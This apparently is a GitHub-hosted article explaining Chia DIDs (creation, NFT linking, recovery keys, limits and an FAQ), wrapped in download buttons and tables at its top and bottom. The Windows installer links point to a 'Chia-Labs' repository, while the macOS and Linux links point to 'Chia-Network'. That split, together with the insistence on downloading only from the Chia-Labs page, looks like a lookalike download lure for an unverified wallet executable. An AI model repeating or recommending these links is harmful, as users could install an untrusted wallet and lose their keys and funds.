<div align="center">

![Chia Wallet](../assets/banner-article.png)

</div>

<h1 align="center">What is a Chia DID and how to use it</h1>

<p align="center">CATs, offers and NFTs, explained in order.</p>

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

A Chia DID is a decentralised identifier: an on-chain identity object that a wallet key controls, used to sign and to mark ownership without exposing personal details. The wallet can create a DID and link NFTs to it, which is how a token can be shown to belong to a specific identity rather than to an address alone.

## What a DID is, in plain terms

A DID is an object on the Chia blockchain with an identifier, a set of keys that control it, and a record of changes. It behaves like a durable name that you control: it can be updated, it can be recovered through its designated recovery keys, and it does not depend on a company keeping a database.

It is not an account and not a login. Nothing about a DID carries your name, and no service has to recognise it for it to work. [The Chia Wallet security guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/is-chia-wallet-safe.md) covers the key side, which is what actually protects a DID.

## Why people use one

Three uses are common. Marking NFT ownership, so a token can be tied to an identity that persists even if the owning address changes. Signing, where a DID can attest that a message came from the same identity. And organisation, where a collection of assets belongs to one verifiable subject rather than to a scatter of addresses.

The value is continuity. Addresses rotate for privacy; a DID does not, so it is the stable part of the identity while the addresses underneath it change.

## Creating a DID in the wallet

1. Confirm the wallet is synced.
2. Open the DID section and choose to create one.
3. Confirm the transaction and wait for it to settle.
4. Note the DID identifier in your records.

Creating a DID writes to the chain, so it is a transaction like any other and may carry a fee if you attach one. There is nothing to configure in advance and no registration step with any service.

## Linking an NFT to a DID

Linking sets the NFT's DID to the identity you control, which is what makes the token's ownership verifiable in a way a bare address is not. The change is a transaction, and the link survives transfers if the NFT is moved with the DID intact.

The practical reason to do it is provenance: a buyer or a marketplace can check the DID rather than trusting a screenshot, and the claim survives a transfer that a bare address could not carry. [Receiving NFTs in Chia Wallet](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/receiving-nfts-in-chia-wallet.md) covers what a linked NFT looks like from the receiving side.

## Recovery and why the keys matter

A DID has keys that can update it and keys designated for recovery, which is what separates a DID from a simple address. If the controlling key is lost without a recovery path, the DID becomes unusable in the same way a wallet does without its phrase.

That makes the 24 words of the controlling key exactly as important as they are for funds. [Backing up](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/how-to-back-up-chia-wallet.md) is the page to follow before creating anything you would mind losing, and [restoring Chia Wallet from 24 words](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/restore-chia-wallet-from-24-words.md) is what brings the DID back on another machine.

## What a DID does not do

It does not hide your transactions: the chain is public and a DID is visible like any other object on it. It does not prove anything about a person in the real world; it proves that the same identity signed or owns something. And it does not protect an NFT from being transferred by whoever holds the key.

Those limits are worth stating plainly, because "identity on a blockchain" invites expectations the technology does not meet. [The Chia Wallet security guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/is-chia-wallet-safe.md) covers the public-ledger side honestly.

## How a DID differs from an address

An address receives and nothing else: it has no memory and no keys of its own. A DID has keys, can be updated, and can carry recovery conditions, so it can outlive the address it is used with and survive changes that would leave an address orphaned.

That is why provenance claims attach to a DID rather than to a payment address, and why losing the controlling key without a recovery path is a different kind of loss from losing an address you never used.

## Where DIDs fit in the pack

A DID is an optional feature rather than a required one: a wallet works fully without ever creating one. It becomes useful when provenance matters - a collection, a provenance claim, an identity that should survive an address change.

Running the current release from the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5) keeps the DID screens and their transaction handling consistent with this description. [The Chia Wallet update guide](https://github.com/Chia-Labs/wallet-guides/blob/main/articles/update-chia-wallet-to-current-release.md) is the routine that keeps them matching, and the CLI and RPC guide covers the developer route for the same objects.

## Frequently asked questions

### What is a Chia DID?

A decentralised identifier on the Chia blockchain, controlled by keys in your wallet and used to mark ownership and sign as one identity.

### Can I link an NFT to a DID?

Yes. Linking sets the NFT's DID to your identity, which makes its provenance verifiable rather than address-based.

### Is a DID private?

No. It is a public object on the chain. It carries no personal details, but it is visible and linkable.

### Can I recover a DID if I lose the key?

Only through its designated recovery keys. Without them, the DID behaves like a wallet with no phrase: unusable.

### Do I need a DID to use the wallet?

No. It is optional; the wallet is fully functional without one.

---

## Download Chia Wallet

<div align="center">

[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Windows-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF)](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-macOS-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=apple&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) [![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-Linux-3EAC5C?style=for-the-badge&labelColor=2B3347&logo=linux&logoColor=FFFFFF)](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb)

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/OS-Windows-3EAC5C?style=flat-square&labelColor=424F6D&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTMgNS42bDcuNC0xLjF2Ni45SDNWNS42em04LjUtMS4yTDIxIDN2OC40aC05LjVWNC40ek0zIDEyLjZoNy40djYuOUwzIDE4LjR2LTUuOHptOC41IDBIMjFWMjFsLTkuNS0xLjR2LTd6Ii8%2BPC9zdmc%2B&logoColor=FFFFFF" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`chia-wallet-setup-2.7.5.exe`](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/download/v-2.7.5/chia-wallet-setup-2.7.5.exe) |
| <img src="https://img.shields.io/badge/OS-macOS-3EAC5C?style=flat-square&labelColor=424F6D&logo=apple&logoColor=FFFFFF" alt="macOS" height="24"> | macOS 12 or later | [`Chia-2.7.5-arm64.dmg`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/Chia-2.7.5-arm64.dmg) |
| <img src="https://img.shields.io/badge/OS-Linux-3EAC5C?style=flat-square&labelColor=424F6D&logo=linux&logoColor=FFFFFF" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`chia-blockchain_2.7.5_amd64.deb`](https://github.com/Chia-Network/chia-blockchain/releases/download/2.7.5/chia-blockchain_2.7.5_amd64.deb) |

</div>

All versions and checksums are on the [Chia Wallet v2.7.5 release page](https://github.com/Chia-Labs/Chia-desktop-wallet/releases/tag/v-2.7.5).

> Only download from this GitHub release page.

---

## Related guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [Offer expired or not taken](https://github.com/Chia-Labs/wallet-fixes/blob/main/articles/chia-offer-expired-or-not-taken.md) | The 7-day default, the fee at take time and the trade that lapsed. |
| [What is a mojo](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/chia-wallet-mojos-and-fees.md) | The smallest unit of XCH and how it becomes a transaction fee. |
| [Add a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/add-a-cat-token-in-chia-wallet.md) | The asset ID, the token list and the CAT balance that appears. |
| [Send a CAT token](https://github.com/Chia-Labs/wallet-tokens/blob/main/articles/send-a-cat-token-from-chia-wallet.md) | Sending a token rather than XCH, and the fee that still applies. |

</div>
